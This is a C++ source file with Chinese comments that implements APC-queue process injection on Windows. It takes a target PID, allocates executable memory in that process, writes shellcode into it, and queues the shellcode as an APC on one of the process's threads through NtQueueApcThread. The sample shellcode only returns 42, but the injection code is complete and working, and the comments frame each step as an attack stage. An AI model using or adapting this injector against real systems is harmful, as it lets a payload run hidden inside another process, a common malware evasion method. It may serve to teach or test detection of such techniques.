#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

// ================= 0. 弹药 =================
unsigned char shellcode[] = {
    0xB8, 0x2A, 0x00, 0x00, 0x00,   // mov eax, 42
    0xC3                             // ret
};
SIZE_T shellcodeSize = sizeof(shellcode);

// NtQueueApcThread 函数指针类型
typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE, PVOID, PVOID, PVOID, PVOID);

// ================= 1. 侦察：找目标线程 =================
DWORD GetFirstThreadId(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    DWORD tid = 0;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    return tid;
}

// ================= 2. 准备：申请内存 + 写入 Shellcode =================
LPVOID PrepareShellcode(HANDLE hProcess) {
    // ① 在目标进程申请一块可执行内存
    LPVOID pRemoteMem = VirtualAllocEx(
        hProcess, NULL, shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        std::cerr << "[-] VirtualAllocEx 失败" << std::endl;
        return nullptr;
    }

    // ② 把 Shellcode 写进去
    if (!WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcodeSize, NULL)) {
        std::cerr << "[-] WriteProcessMemory 失败" << std::endl;
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        return nullptr;
    }

    std::cout << "[+] Shellcode 写入成功: 0x"
              << std::hex << (uintptr_t)pRemoteMem << std::dec << std::endl;
    return pRemoteMem;
}

// ================= 3. 执行：往目标线程里插入 APC =================
bool QueueApcToThread(DWORD pid, LPVOID pRemoteMem) {
    // ① 找目标进程的一个线程
    DWORD tid = GetFirstThreadId(pid);
    if (tid == 0) {
        std::cerr << "[-] 未找到目标线程" << std::endl;
        return false;
    }
    std::cout << "[+] 目标线程 ID: " << tid << std::endl;

    // ② 打开线程（需要 SET_CONTEXT 权限，因为要改它的执行流）
    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
    if (!hThread) {
        std::cerr << "[-] OpenThread 失败: " << GetLastError() << std::endl;
        return false;
    }

    // ③ 拿到 NtQueueApcThread 地址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)
        GetProcAddress(hNtdll, "NtQueueApcThread");
    if (!NtQueueApcThread) {
        std::cerr << "[-] 找不到 NtQueueApcThread" << std::endl;
        CloseHandle(hThread);
        return false;
    }

    // ④ 把 APC 塞进目标线程的待办队列
    //    第一个参数：目标线程句柄
    //    第二个参数：ApcRoutine（要执行的函数地址，这里是 Shellcode）
    NTSTATUS status = NtQueueApcThread(
        hThread,
        (PVOID)pRemoteMem,   // ApcRoutine = Shellcode 地址
        NULL, NULL, NULL);
    CloseHandle(hThread);

    if (status != 0) {
        std::cerr << "[-] NtQueueApcThread 失败: 0x"
                  << std::hex << status << std::dec << std::endl;
        return false;
    }
    std::cout << "[+] APC 插入成功，等待目标线程进入可提醒状态..." << std::endl;
    return true;
}

// ================= 4. main：干净的三步走 =================
int main() {
    DWORD pid;
    std::cout << "[*] 请输入目标进程 PID: ";
    std::cin >> pid;

    // 第一步：打开进程
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_QUERY_INFORMATION,
        FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess 失败: " << GetLastError() << std::endl;
        return 1;
    }

    // 第二步：申请内存 + 写 Shellcode
    LPVOID pRemoteMem = PrepareShellcode(hProcess);
    if (!pRemoteMem) {
        CloseHandle(hProcess);
        return 1;
    }

    // 第三步：把 APC 塞进目标线程的队列
    if (!QueueApcToThread(pid, pRemoteMem)) {
        VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 清理进程句柄（注意：内存不能立刻释放，APC 可能还没执行）
    CloseHandle(hProcess);

    std::cout << "[*] 提示：如果目标线程一直不进入可提醒状态，APC 永远不会执行。" << std::endl;
    std::cout << "[*] 可以用 Spy++ 或 Process Hacker 观察目标进程线程状态。" << std::endl;

    system("pause");
    return 0;
}